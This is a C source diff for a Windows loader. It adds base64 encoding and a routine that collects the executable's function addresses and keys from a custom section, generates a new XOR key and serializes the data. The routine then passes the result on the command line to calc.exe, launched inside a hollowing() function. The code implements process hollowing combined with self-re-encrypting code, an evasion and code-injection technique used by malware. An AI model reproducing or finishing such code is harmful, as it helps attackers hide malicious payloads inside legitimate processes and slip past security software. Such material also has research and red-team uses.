@@ -128,13 +128,190 @@ void fixIAT(UINT_PTR baseAddress) {
     }
 }
 
-#define RELOC_32BIT_FIELD 3
-#define RELOC_64BIT_FIELD 10
+// https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/
+size_t b64_encoded_size(size_t inlen)
+{
+    size_t ret;
 
-typedef struct _BASE_RELOCATION_ENTRY {
-    WORD Offset : 12;
-    WORD Type: 4;
-} BASE_RELOCATION_ENTRY;
+    ret = inlen;
+    if (inlen % 3 != 0)
+        ret += 3 - (inlen % 3);
+    ret /= 3;
+    ret *= 4;
+
+    return ret;
+}
+
+char *b64_encode(const unsigned char *in, size_t len)
+{
+    char   *out;
+    size_t  elen;
+    size_t  i;
+    size_t  j;
+    size_t  v;
+
+    if (in == NULL || len == 0)
+        return NULL;
+
+    elen = b64_encoded_size(len);
+    out  = malloc(elen+1);
+    out[elen] = '\0';
+
+    for (i=0, j=0; i<len; i+=3, j+=4) {
+        v = in[i];
+        v = i+1 < len ? v << 8 | in[i+1] : v << 8;
+        v = i+2 < len ? v << 8 | in[i+2] : v << 8;
+
+        out[j]   = b64chars[(v >> 18) & 0x3F];
+        out[j+1] = b64chars[(v >> 12) & 0x3F];
+        if (i+1 < len) {
+            out[j+2] = b64chars[(v >> 6) & 0x3F];
+        } else {
+            out[j+2] = '=';
+        }
+        if (i+2 < len) {
+            out[j+3] = b64chars[v & 0x3F];
+        } else {
+            out[j+3] = '=';
+        }
+    }
+
+    return out;
+}
+
+void writeSharedMemory(char **commandline) {
+    // Function info
+    FunctionInfo* functions = NULL;
+    size_t numFunctions = 0;
+    functions = analyzeExecutable(&numFunctions);
+    if (functions == NULL || numFunctions == 0) {
+        fprintf(stderr, "No functions found or failed to analyze executable.\n");
+        return;
+    }
+
+    // Base address of the loaded module
+    UINT_PTR baseAddress = (UINT_PTR)GetModuleHandle(NULL);
+    if (baseAddress == 0) {
+        fprintf(stderr, "Failed to get the base address of the module.\n");
+        return;
+    }
+
+    // Decryption key
+    srand(time(NULL));
+    unsigned char nextEncryptionKey = (unsigned char)(rand() % 256);
+
+    // Encryption key
+    unsigned char encryptionKey = 0x00;
+    encryptionKey = *((unsigned char *)(baseAddress + getMetaSectionAddress(baseAddress) + getMetaSectionVirtualSize(baseAddress) - sizeof(encryptionKey)));
+    if (encryptionKey == 0x00) {
+        printf("Encryption Key not found.\n");
+        free(functions);
+        return;
+    }
+    unsigned char recryptionKey = nextEncryptionKey ^ encryptionKey;
+
+    // Current executable path
+    char executablePath[512] = {0};
+    if (GetModuleFileName(NULL, executablePath, sizeof(executablePath)) == 0) {
+        fprintf(stderr, "Error getting executable path: %ld\n", GetLastError());
+        free(functions);
+        return;
+    }
+
+    // Key address
+    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);
+
+    ProcessData data = {0};
+    strncpy(data.executablePath, executablePath, sizeof(executablePath));
+    data.numFunctions = numFunctions;
+    data.functions = functions;
+    data.recryptionKey = recryptionKey;
+    data.nextEncryptionKey = nextEncryptionKey;
+    data.keyAddress = keyAddress;
+    /*
+    typedef struct {
+        ULONGLONG virtualAddress; // RVA offset
+        ULONGLONG physicalAddress; // File offset
+        ULONGLONG size; // Size of the function in memory (it might error on disk... i'll take my chances for now)
+        char name[64];        // Name of the function
+    } FunctionInfo;
+    */
+    printf("Executable Path: %s\n", executablePath);
+    printf("Number of Functions: %zu\n", numFunctions);
+    for (size_t i = 0; i < numFunctions; ++i) {
+        printf("Function %zu:\tVA: 0x%08llX, PA: 0x%08llX, S: %08llu, N: %s\n", i, functions[i].virtualAddress, functions[i].physicalAddress, functions[i].size, functions[i].name);
+    }
+    printf("Recryption Key: 0x%hhX\n", recryptionKey);
+    printf("Next Encryption Key: 0x%hhX\n", nextEncryptionKey);
+    printf("Key Address: 0x%08llu\n\n", keyAddress);
+
+    // Make sure size is sufficient
+    size_t total_size = sizeof(numFunctions) +  // numFunctions
+                        sizeof(recryptionKey) + // recryptionKey
+                        sizeof(nextEncryptionKey) + // nextEncryptionKey
+                        sizeof(keyAddress) + // keyAddress
+                        sizeof(executablePath); // executablePath
+
+    // Add size of functions
+    for (size_t i = 0; i < data.numFunctions; ++i) {
+        total_size += sizeof(ULONGLONG) + sizeof(ULONGLONG) + sizeof(ULONGLONG) + sizeof(((FunctionInfo*)0)->name);
+    }
+
+    total_size += 1;
+
+    printf("Total Size: 0x%04llX\n", total_size);
+
+    unsigned char *buffer = (unsigned char *)malloc(total_size);
+    if (!buffer) {
+        fprintf(stderr, "Failed to allocate memory for buffer\n");
+        return;
+    }
+
+    unsigned char *ptr = buffer;
+
+    // Serialize executablePath
+    memcpy(ptr, executablePath, sizeof(executablePath));
+    ptr += sizeof(executablePath);
+
+    // Serialize numFunctions
+    memcpy(ptr, &numFunctions, sizeof(numFunctions));
+    ptr += sizeof(numFunctions);
+
+    // Serialize FunctionInfo array
+    for (size_t i = 0; i < numFunctions; ++i) {
+        memcpy(ptr, &(functions[i].virtualAddress), sizeof(ULONGLONG));
+        ptr += sizeof(ULONGLONG);
+        memcpy(ptr, &(functions[i].physicalAddress), sizeof(ULONGLONG));
+        ptr += sizeof(ULONGLONG);
+        memcpy(ptr, &(functions[i].size), sizeof(ULONGLONG));
+        ptr += sizeof(ULONGLONG);
+        memcpy(ptr, &(functions[i].name), sizeof(((FunctionInfo*)0)->name));
+        ptr += sizeof(((FunctionInfo*)0)->name);
+        printf("Current Idx: 0x%04llX\n", ptr - buffer);
+    }
+
+    // Serialize recryptionKey
+    memcpy(ptr, &recryptionKey, sizeof(recryptionKey));
+    ptr += sizeof(recryptionKey);
+
+    // Serialize nextEncryptionKey
+    memcpy(ptr, &nextEncryptionKey, sizeof(nextEncryptionKey));
+    ptr += sizeof(nextEncryptionKey);
+
+    // Serialize keyAddress
+    memcpy(ptr, &keyAddress, sizeof(keyAddress));
+    ptr += sizeof(keyAddress);
+
+    // Base64 encode the serialized data
+    *commandline = b64_encode((const unsigned char *)buffer, total_size);
+    if (*commandline) {
+        printf("Base64 encoded data: %s\n", *commandline);
+    } else {
+        fprintf(stderr, "Failed to base64 encode the data\n");
+    }
+
+    free(buffer);
+}
 
 IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
 {
@@ -247,16 +424,17 @@ void hollowing() {
     
     tStartupInformation.cb = sizeof(STARTUPINFOA);
     
-    // Path to the executables
     char getPath[MAX_PATH];
     DWORD result = GetModuleFileNameA(NULL, getPath, MAX_PATH);
     LPCSTR hName = (LPCSTR)getPath;
     LPCSTR tName = "C:\\Windows\\System32\\calc.exe";
 
-    // Create the process
+    char *commandline = NULL;
+    writeSharedMemory(&commandline);
+
     BOOL success = CreateProcessA(
         tName,
-        NULL,
+        commandline,
         NULL,
         NULL,
         FALSE,
@@ -266,6 +444,8 @@ void hollowing() {
         &tStartupInformation,
         &tProcessInformation
     );
+
+    //free(commandline);
 
     if (!success) {
         printf("CreateProcessA failed with error code %lu\n", GetLastError());
